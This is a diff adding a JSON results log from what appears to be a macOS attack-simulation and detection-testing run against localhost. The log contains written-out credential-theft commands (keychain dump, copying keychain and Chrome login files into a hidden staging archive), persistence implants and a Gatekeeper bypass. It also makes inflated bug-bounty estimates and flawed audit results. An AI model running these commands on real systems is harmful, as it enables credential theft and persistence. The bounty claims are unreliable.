@@ -1,0 +1,810 @@
+{
+  "target": "localhost",
+  "start_time": "2026-03-24T19:41:11.859539+00:00",
+  "end_time": "2026-03-24T19:42:16.716391+00:00",
+  "duration_seconds": 64.856852,
+  "total_techniques": 29,
+  "results": {
+    "success": 17,
+    "failed": 2,
+    "blocked": 8,
+    "error": 2,
+    "skipped": 0
+  },
+  "bounty_hits": [
+    {
+      "technique": "tcc_permission_reset",
+      "mitre_id": "T1548.006",
+      "category": "Unauthorized access to sensitive data",
+      "estimate": "$25,000-$50,000"
+    },
+    {
+      "technique": "dyld_insert_implant",
+      "mitre_id": "T1574.006",
+      "category": "Code execution in privileged context",
+      "estimate": "$50,000-$100,000"
+    },
+    {
+      "technique": "login_item_implant",
+      "mitre_id": "T1547.015",
+      "category": "Unauthorized persistence mechanism",
+      "estimate": "$25,000"
+    },
+    {
+      "technique": "quarantine_xattr_bypass",
+      "mitre_id": "T1553.001",
+      "category": "Gatekeeper bypass",
+      "estimate": "$25,000-$100,000"
+    },
+    {
+      "technique": "privileged_helper_probe",
+      "mitre_id": "T1559.003",
+      "category": "Privilege escalation via XPC",
+      "estimate": "$50,000-$100,000"
+    },
+    {
+      "technique": "tcc_service_probe",
+      "mitre_id": "T1548.006",
+      "category": "TCC bypass via XPC",
+      "estimate": "$50,000-$100,000"
+    }
+  ],
+  "techniques": [
+    {
+      "technique_id": "tcc_db_read",
+      "technique_name": "Direct read of TCC.db to extract permission grants",
+      "mitre_id": "T1548.006",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:11.877841+00:00",
+      "duration_ms": 16.169750000699423,
+      "details": {
+        "tcc_paths": {
+          "~/Library/Application Support/com.apple.TCC/TCC.db": {
+            "stdout": "Error: in prepare, near \"Support\": syntax error\n  Support/com.apple.TCC/TCC.db\n  ^--- error here\n",
+            "stderr": "",
+            "returncode": 1,
+            "accessible": false
+          },
+          "/Library/Application Support/com.apple.TCC/TCC.db": {
+            "stdout": "Error: unable to open database \"/Library/Application\": unable to open database file\n",
+            "stderr": "",
+            "returncode": 1,
+            "accessible": false
+          }
+        },
+        "tcc_bypass": false
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "TCCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_db_copy_read",
+      "technique_name": "Copy TCC.db to temp and read outside SIP protection",
+      "mitre_id": "T1548.006",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:11.892226+00:00",
+      "duration_ms": 14.352166996104643,
+      "details": {
+        "copy_result": "success",
+        "read_result": "",
+        "bypass_worked": false
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "TCCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_permission_reset",
+      "technique_name": "Reset TCC permissions via tccutil to force re-consent dialogs",
+      "mitre_id": "T1548.006",
+      "status": "success",
+      "timestamp": "2026-03-24T19:41:11.916965+00:00",
+      "duration_ms": 24.71858300123131,
+      "details": {
+        "output": "Successfully reset All approval status for com.apple.Terminal\n",
+        "error": ""
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "TCCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$25,000-$50,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_screencapture",
+      "technique_name": "Attempt screencapture without screen recording TCC grant",
+      "mitre_id": "T1113",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:12.030900+00:00",
+      "duration_ms": 113.9012499988894,
+      "details": {
+        "capture_output": "screencapture: cannot write file to intended destination, /tmp/.amoskys_screen_test.png\n",
+        "file_created": false,
+        "file_info": "ls: /tmp/.amoskys_screen_test.png: No such file or directory\n"
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "ScreenCaptureProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$25,000-$50,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_clipboard_read",
+      "technique_name": "Read pasteboard contents to test clipboard TCC enforcement",
+      "mitre_id": "T1115",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:12.041411+00:00",
+      "duration_ms": 10.481375000381377,
+      "details": {
+        "clipboard_accessible": false,
+        "content_length": 0,
+        "content_preview": "empty"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "ClipboardProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$25,000-$50,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_contacts_read",
+      "technique_name": "Read AddressBook database to test Contacts TCC enforcement",
+      "mitre_id": "T1005",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:12.081764+00:00",
+      "duration_ms": 40.32537499733735,
+      "details": {
+        "contacts_accessible": false,
+        "output": ""
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "TCCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized access to sensitive data",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_fake_dialog",
+      "technique_name": "Spawn osascript password dialog to harvest credentials",
+      "mitre_id": "T1056.002",
+      "status": "success",
+      "timestamp": "2026-03-24T19:41:15.232285+00:00",
+      "duration_ms": 3150.52279199881,
+      "details": {
+        "dialog_spawned": true,
+        "output": "button returned:, gave up:true\n",
+        "error": ""
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "FakeDialogProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "keychain_dump",
+      "technique_name": "Dump Keychain items via 'security' CLI tool",
+      "mitre_id": "T1555.001",
+      "status": "error",
+      "timestamp": "2026-03-24T19:41:45.236820+00:00",
+      "duration_ms": 30004.534915999102,
+      "details": {},
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "KeychainAccessProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": "Command 'security dump-keychain -d 2>&1 | head -50' timed out after 30 seconds"
+    },
+    {
+      "technique_id": "browser_cred_harvest",
+      "technique_name": "Read Chrome/Firefox/Safari credential stores",
+      "mitre_id": "T1555.003",
+      "status": "failed",
+      "timestamp": "2026-03-24T19:41:45.302351+00:00",
+      "duration_ms": 65.47820800187765,
+      "details": {
+        "browsers": {
+          "chrome_login": {
+            "exists": false,
+            "readable": false,
+            "info": ""
+          },
+          "chrome_cookies": {
+            "exists": false,
+            "readable": false,
+            "info": ""
+          },
+          "firefox_logins": {
+            "exists": false,
+            "readable": false,
+            "info": ""
+          },
+          "safari_history": {
+            "exists": true,
+            "readable": false,
+            "info": "/Users/athanneeru/Library/Safari/History.db: cannot open: Operation not permitted\n"
+          }
+        }
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "BrowserCacheProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "crypto_wallet_access",
+      "technique_name": "Scan for cryptocurrency wallet files on target",
+      "mitre_id": "T1005",
+      "status": "success",
+      "timestamp": "2026-03-24T19:41:45.336620+00:00",
+      "duration_ms": 34.224208000523504,
+      "details": {
+        "wallets": {
+          "~/Library/Application Support/Exodus": {
+            "exists": false,
+            "info": ""
+          },
+          "~/Library/Application Support/Electrum": {
+            "exists": false,
+            "info": ""
+          },
+          "~/Library/Application Support/Bitcoin": {
+            "exists": false,
+            "info": ""
+          },
+          "~/Library/Application Support/Ethereum": {
+            "exists": false,
+            "info": ""
+          },
+          "~/Library/Application Support/Metamask": {
+            "exists": false,
+            "info": ""
+          },
+          "~/Library/Keychains/": {
+            "exists": true,
+            "info": "total 1440\ndrwxr-xr-x  16 athanneeru  staff     512 Mar 24 14:39 .\ndrwx------@ 99 athanneeru  staff    3168 Mar 24 03:09 ..\n-r--r--r--   1 athanneeru  staff       0 May 22  2025 .fl34AC2A0A\n-r--------"
+          }
+        },
+        "wallets_found": 1
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "WalletTheftProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "credential_staging",
+      "technique_name": "Archive credential files into staging directory for exfil",
+      "mitre_id": "T1560.001",
+      "status": "success",
+      "timestamp": "2026-03-24T19:41:45.378624+00:00",
+      "duration_ms": 41.97795800428139,
+      "details": {
+        "steps": [
+          {
+            "cmd": "mkdir -p /tmp/.amoskys_staging",
+            "rc": 0,
+            "out": ""
+          },
+          {
+            "cmd": "cp ~/Library/Keychains/login.keychain-db /tmp/.amoskys_staging/ 2>/dev/null; tru",
+            "rc": 0,
+            "out": ""
+          },
+          {
+            "cmd": "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/.amosky",
+            "rc": 0,
+            "out": ""
+          },
+          {
+            "cmd": "tar czf /tmp/.amoskys_creds.tar.gz -C /tmp .amoskys_staging 2>&1",
+            "rc": 0,
+            "out": ""
+          },
+          {
+            "cmd": "ls -la /tmp/.amoskys_creds.tar.gz 2>&1",
+            "rc": 0,
+            "out": "-rw-r--r--@ 1 athanneeru  wheel  201336 Mar 24 14:41 /tmp/.amoskys_creds.tar.gz\n"
+          }
+        ],
+        "archive_created": true
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "CredentialArchiveProbe",
+      "blue_team_agent": "InfostealerGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "launchagent_implant",
+      "technique_name": "Create LaunchAgent plist in ~/Library/LaunchAgents",
+      "mitre_id": "T1543.001",
+      "status": "success",
+      "timestamp": "2026-03-24T19:41:45.406409+00:00",
+      "duration_ms": 27.716499993402977,
+      "details": {
+        "plist_created": true,
+        "plist_valid": true,
+        "load_result": ""
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "LaunchAgentProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "launchdaemon_implant",
+      "technique_name": "Attempt LaunchDaemon persistence in /Library/LaunchDaemons (requires root)",
+      "mitre_id": "T1543.004",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:41:45.410931+00:00",
+      "duration_ms": 4.481707997911144,
+      "details": {
+        "daemon_writable": false,
+        "error": "",
+        "note": "Correctly blocked"
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "LaunchAgentProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized modification of system files",
+      "bounty_estimate": "$25,000-$50,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "cron_implant",
+      "technique_name": "Install cron job via crontab for persistence",
+      "mitre_id": "T1053.003",
+      "status": "error",
+      "timestamp": "2026-03-24T19:42:15.418671+00:00",
+      "duration_ms": 30007.827125002223,
+      "details": {},
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "CronModificationProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": "Command '(crontab -l 2>/dev/null; echo \"* * * * * /usr/bin/true # AMOSKYS-RED-TEST\") | crontab - 2>&1' timed out after 30 seconds"
+    },
+    {
+      "technique_id": "ssh_key_implant",
+      "technique_name": "Add attacker SSH key to ~/.ssh/authorized_keys",
+      "mitre_id": "T1098.004",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:15.438831+00:00",
+      "duration_ms": 20.077582994417753,
+      "details": {
+        "key_installed": true
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "SSHKeyProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "shell_profile_implant",
+      "technique_name": "Inject command into .zshrc/.bash_profile for shell persistence",
+      "mitre_id": "T1546.004",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:15.449548+00:00",
+      "duration_ms": 10.684084001695737,
+      "details": {
+        "profile": "~/.zshrc",
+        "injected": true
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "UnixShellConfigProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "dyld_insert_implant",
+      "technique_name": "Test DYLD_INSERT_LIBRARIES for dylib injection",
+      "mitre_id": "T1574.006",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:15.462878+00:00",
+      "duration_ms": 13.291916002344806,
+      "details": {
+        "basic_binary": "RC=0\n",
+        "hardened_binary": "OpenSSH_10.0p2, LibreSSL 3.3.6\n",
+        "note": "If DYLD injection works on hardened/SIP binaries, that's a bug"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "DylibInjectionProbe",
+      "blue_team_agent": "ProcessAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Code execution in privileged context",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "login_item_implant",
+      "technique_name": "Add Login Item via osascript for reboot persistence",
+      "mitre_id": "T1547.015",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:15.689094+00:00",
+      "duration_ms": 226.19070800283225,
+      "details": {
+        "login_item_added": true,
+        "output": "login item AMOSKYS-Test\n"
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "LoginItemProbe",
+      "blue_team_agent": "PersistenceGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Unauthorized persistence mechanism",
+      "bounty_estimate": "$25,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "quarantine_xattr_bypass",
+      "technique_name": "Remove com.apple.quarantine xattr to bypass Gatekeeper",
+      "mitre_id": "T1553.001",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:15.998064+00:00",
+      "duration_ms": 308.90079099481227,
+      "details": {
+        "quarantine_was_set": true,
+        "quarantine_removed": true,
+        "execution_after_bypass": true
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "QuarantineBypassProbe",
+      "blue_team_agent": "QuarantineGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Gatekeeper bypass",
+      "bounty_estimate": "$25,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "quarantine_flag_audit",
+      "technique_name": "Audit quarantine flags on files in ~/Downloads",
+      "mitre_id": "T1553.001",
+      "status": "failed",
+      "timestamp": "2026-03-24T19:42:16.080481+00:00",
+      "duration_ms": 82.35537500149803,
+      "details": {
+        "files_without_quarantine": 0,
+        "files_with_quarantine": 20,
+        "unquarantined": [],
+        "note": "Files without quarantine flag bypass Gatekeeper checks"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "QuarantineBypassProbe",
+      "blue_team_agent": "QuarantineGuardAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "adhoc_code_signing",
+      "technique_name": "Sign a binary with ad-hoc signature to bypass unsigned binary checks",
+      "mitre_id": "T1553.002",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.262050+00:00",
+      "duration_ms": 181.54091700125718,
+      "details": {
+        "adhoc_signed": true,
+        "signature_details": "Executable=/private/tmp/amoskys_gk_signed\nIdentifier=amoskys_gk_signed-a642f8dea484fc82df70a2ec6dcbf211189177fc\nFormat=generic\nCodeDirectory v=20100 size=203 flags=0x2(adhoc) hashes=1+2 location=embedded\nSignature=adhoc\nInfo.plist=not bound\nTeamIdentifier=not set\nSealed Resources=none\nInternal requi",
+        "executed": true
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "CodeSigningProbe",
+      "blue_team_agent": "ProcessAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "gatekeeper_assessment",
+      "technique_name": "Assess Gatekeeper configuration and enforcement level",
+      "mitre_id": "T1553.001",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.283726+00:00",
+      "duration_ms": 21.631374998833053,
+      "details": {
+        "gatekeeper_enabled": true,
+        "gatekeeper_status": "assessments enabled",
+        "sip_enabled": true,
+        "sip_status": "System Integrity Protection status: enabled.",
+        "quarantine_policy": "2026-03-24 14:42:16.283 defaults[33728:3016280] \nThe domain/default pair of (com.apple.LaunchServices, LSQuarantine) does not exist"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "GatekeeperProbe",
+      "blue_team_agent": "SecurityMonitorAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "unsigned_execution",
+      "technique_name": "Execute unsigned binary to test Gatekeeper enforcement",
+      "mitre_id": "T1204.002",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:42:16.300338+00:00",
+      "duration_ms": 16.57487500051502,
+      "details": {
+        "unsigned_executed": false,
+        "output": "/bin/sh: /tmp/amoskys_unsigned_test: /bin/bash: bad interpreter: Operation not permitted\n",
+        "error": "",
+        "note": "Correctly blocked"
+      },
+      "artifacts": [],
+      "cleanup_done": true,
+      "blue_team_probe": "UnsignedDownloadProbe",
+      "blue_team_agent": "QuarantineGuardAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Gatekeeper bypass",
+      "bounty_estimate": "$25,000-$50,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "notarization_check",
+      "technique_name": "Audit installed apps for missing notarization",
+      "mitre_id": "T1553.001",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.382265+00:00",
+      "duration_ms": 81.90308300254401,
+      "details": {
+        "apps_checked": {
+          "/Applications/Safari.app": {
+            "exists": true,
+            "notarized": false,
+            "team_id": "not set",
+            "details": ""
+          },
+          "/Applications/Google Chrome.app": {
+            "exists": true,
+            "notarized": false,
+            "team_id": "EQHXZ8M8AV",
+            "details": ""
+          },
+          "/Applications/Visual Studio Code.app": {
+            "exists": true,
+            "notarized": false,
+            "team_id": "UBF8T346G9",
+            "details": ""
+          },
+          "/Applications/Slack.app": {
+            "exists": true,
+            "notarized": false,
+            "team_id": "BQR82RBBHL",
+            "details": ""
+          },
+          "/Applications/Discord.app": {
+            "exists": false
+          }
+        },
+        "unnotarized_apps": [
+          "/Applications/Safari.app",
+          "/Applications/Google Chrome.app",
+          "/Applications/Visual Studio Code.app",
+          "/Applications/Slack.app"
+        ]
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "GatekeeperProbe",
+      "blue_team_agent": "SecurityMonitorAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "xpc_service_enum",
+      "technique_name": "Enumerate XPC/Mach services via launchctl",
+      "mitre_id": "T1559.003",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.403224+00:00",
+      "duration_ms": 20.912959000270348,
+      "details": {
+        "launchd_services": 50,
+        "privileged_helpers": [
+          "com.docker.socket",
+          "com.docker.vmnetd",
+          "com.microsoft.autoupdate.helper",
+          "com.microsoft.office.licensingV2.helper",
+          "com.philandro.anydesk.Helper",
+          "com.vmware.DiskHelper",
+          "com.vmware.IDHelper",
+          "com.vmware.MountHelper",
+          "us.zoom.ZoomDaemon"
+        ],
+        "system_xpc_services": 0,
+        "xpc_sample": [],
+        "user_xpc": ""
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "XPCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "privileged_helper_probe",
+      "technique_name": "Probe privileged helper tools for weak authorization checks",
+      "mitre_id": "T1559.003",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.596986+00:00",
+      "duration_ms": 193.7242080020951,
+      "details": {
+        "helpers_found": 9,
+        "analysis": {
+          "com.docker.socket": {
+            "signing": "/Library/PrivilegedHelperTools/com.docker.socket: Permission denied\n",
+            "entitlements": "/Library/PrivilegedHelperTools/com.docker.socket: Permission denied\n",
+            "auth_strings": "",
+            "has_entitlements": false
+          },
+          "com.docker.vmnetd": {
+            "signing": "Executable=/Library/PrivilegedHelperTools/com.docker.vmnetd\nIdentifier=com.docker.vmnetd\nFormat=Mach-O thin (arm64)\nCodeDirectory v=20500 size=49021 flags=0x10000(runtime) hashes=1526+2 location=embedded\nSignature size=8971\nAuthority=Developer ID Application: Docker Inc (9BNSXJN65R)\nAuthority=Develo",
+            "entitlements": "Executable=/Library/PrivilegedHelperTools/com.docker.vmnetd\n",
+            "auth_strings": "darwinnetdnsdomaingophertelnetreturn.locallisten.onionndots:ip+netsocketacceptsetenvTMPDIRrenameremovelogrus:line vendorclientuserIdStringFormat[]byteuint16uint32uint64structchan<-<-chan Valuesysmontimersefenceselect, not GOROOTobject next= jobs=status goid sweep  B -> % util alloc free  span= prev=",
+            "has_entitlements": false
+          },
+          "com.microsoft.autoupdate.helper": {
+            "signing": "Executable=/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper\nIdentifier=com.microsoft.autoupdate.helper\nFormat=Mach-O universal (x86_64 arm64)\nCodeDirectory v=20500 size=1259 flags=0x12000(library-validation,runtime) hashes=28+7 location=embedded\nSignature size=9011\nAuthority=Developer ",
+            "entitlements": "Executable=/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper\n[Dict]\n\t[Key] com.apple.application-identifier\n\t[Value]\n\t\t[String] UBF8T346G9.com.microsoft.autoupdate.helper\n",
+            "auth_strings": "MAUHelperInstallClientProtocol\nMAUHelperToolRecoveryClientProtocol\nMAUHelperInstallClientProtocol\nMAUHelperToolRecoveryClientProtocol\n",
+            "has_entitlements": false
+          },
+          "com.microsoft.office.licensingV2.helper": {
+            "signing": "Executable=/Library/PrivilegedHelperTools/com.microsoft.office.licensingV2.helper\nIdentifier=com.microsoft.office.licensingV2.helper\nFormat=Mach-O universal (x86_64 arm64)\nCodeDirectory v=20500 size=5427 flags=0x10000(runtime) hashes=158+7 location=embedded\nSignature size=9012\nAuthority=Developer ID",
+            "entitlements": "Executable=/Library/PrivilegedHelperTools/com.microsoft.office.licensingV2.helper\n[Dict]\n\t[Key] com.apple.application-identifier\n\t[Value]\n\t\t[String] UBF8T346G9.com.microsoft.office.licensingV2.helper\n",
+            "auth_strings": "SetupInvalidMemoryAccessHandler: mach_port_insert_right:\nSetupInvalidMemoryAccessHandler: mach_port_insert_right:\n",
+            "has_entitlements": false
+          },
+          "com.philandro.anydesk.Helper": {
+            "signing": "Executable=/Library/PrivilegedHelperTools/com.philandro.anydesk.Helper\nIdentifier=com.philandro.anydesk.Helper\nFormat=Mach-O universal (x86_64 arm64)\nCodeDirectory v=20500 size=7016 flags=0x10000(runtime) hashes=208+7 location=embedded\nSignature size=9063\nAuthority=Developer ID Application: AnyDesk ",
+            "entitlements": "Executable=/Library/PrivilegedHelperTools/com.philandro.anydesk.Helper\n[Dict]\n\t[Key] com.apple.security.automation.apple-events\n\t[Value]\n\t\t[Bool] true\n",
+            "auth_strings": "authRightName\nauthRightDefault\nauthRightDescription\nSMAuthorizedClients\nauthRightNames\n",
+            "has_entitlements": false
+          }
+        },
+        "note": "Helpers without proper SMAuthorizedClients checks may be exploitable"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "XPCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Privilege escalation via XPC",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "mach_port_enum",
+      "technique_name": "Enumerate Mach ports for IPC attack surface mapping",
+      "mitre_id": "T1559",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.610883+00:00",
+      "duration_ms": 13.870707996829879,
+      "details": {
+        "mach_info": "\tdeath port = 0x1903\n\t\t       0   (pe) \tcom.apple.ReportSystemMemory\n\t\t       0      - \tcom.apple.diagnosticextensions.osx.timemachine.helper\n\t\t       0      - \tcom.apple.swiftuitracingsupport.xpc\n\t\t       0      0 \tcom.apple.gkreport\n\t\t       0   (pe) \tcom.apple.endpointsecurity.endpointsecurityd\n\t\t     512      - \tcom.apple.airportd\n\t\t       0      0 \tcom.apple.signpost.signpost_reporter\n\t\t   32093   (pe) \tcom.apple.ReportCrash.Root\n\t\t    1810      - \tcom.apple.CrashReporterSupportHelper\n\t\t   ",
+        "apple_services": "\t\tcom.apple.launchd.service-stats-default (4096 records)\n\tauxiliary bootstrapper = com.apple.xpc.smd (complete)\n\t\t       0      - \tcom.apple.lskdd\n\t\t       0   (pe) \tcom.apple.kernelmanager_helper\n\t\t     416      - \tcom.apple.runningboardd\n\t\t       0      - \tcom.apple.installcoordination_proxy\n\t\t       0      1 \tcom.apple.wifiFirmwareLoader\n\t\t       0      - \tcom.apple.uninstalld\n\t\t       0      - \tcom.apple.diagnosticextensions.osx.spotlight.helper\n\t\t       0      - \tcom.apple.tzlinkd\n\t\t       "
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "XPCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": false,
+      "bounty_category": "",
+      "bounty_estimate": "",
+      "error_message": ""
+    },
+    {
+      "technique_id": "auth_plugin_probe",
+      "technique_name": "Probe authorization plugin directories for abuse potential",
+      "mitre_id": "T1556",
+      "status": "blocked",
+      "timestamp": "2026-03-24T19:42:16.638567+00:00",
+      "duration_ms": 27.648959003272466,
+      "details": {
+        "auth_db": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>class</key>\n\t<string>evaluate-mechanisms</string>\n\t<key>comment</key>\n\t<string>Login mechanism based rule.  Not for general",
+        "plugins": "total 0\ndrwxr-xr-x  2 root  wheel   64 Sep  9  2025 .\ndrwxr-xr-x  4 root  wheel  128 Sep  9  2025 ..\n",
+        "plugin_dir_writable": false,
+        "note": "Correctly protected"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "SecuritydProbe",
+      "blue_team_agent": "SecurityMonitorAgent",
+      "bounty_eligible": true,
+      "bounty_category": "Authentication bypass",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    },
+    {
+      "technique_id": "tcc_service_probe",
+      "technique_name": "Probe tccd service for TCC bypass via XPC",
+      "mitre_id": "T1548.006",
+      "status": "success",
+      "timestamp": "2026-03-24T19:42:16.716287+00:00",
+      "duration_ms": 77.68654199753655,
+      "details": {
+        "tccd_running": true,
+        "tccd_info": "root             32825   2.1  0.1 435368576  14896   ??  Ss   12:01AM   0:35.36 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system\nathanneeru       32824   1.1  0.1 435372528  17088  ",
+        "tcc_xpc_services": "32824\t-9\tcom.apple.tccd\n",
+        "tcc_db_permissions": "ls: /Users/athanneeru/Library/Application Support/com.apple.TCC/: Operation not permitted\ntotal 0\n",
+        "tcc_defaults": "2026-03-24 14:42:16.715 defaults[33821:3016544] \nDomain com.apple.TCC does not exist\n"
+      },
+      "artifacts": [],
+      "cleanup_done": false,
+      "blue_team_probe": "TCCProbe",
+      "blue_team_agent": "UnifiedLogAgent",
+      "bounty_eligible": true,
+      "bounty_category": "TCC bypass via XPC",
+      "bounty_estimate": "$50,000-$100,000",
+      "error_message": ""
+    }
+  ]
+}
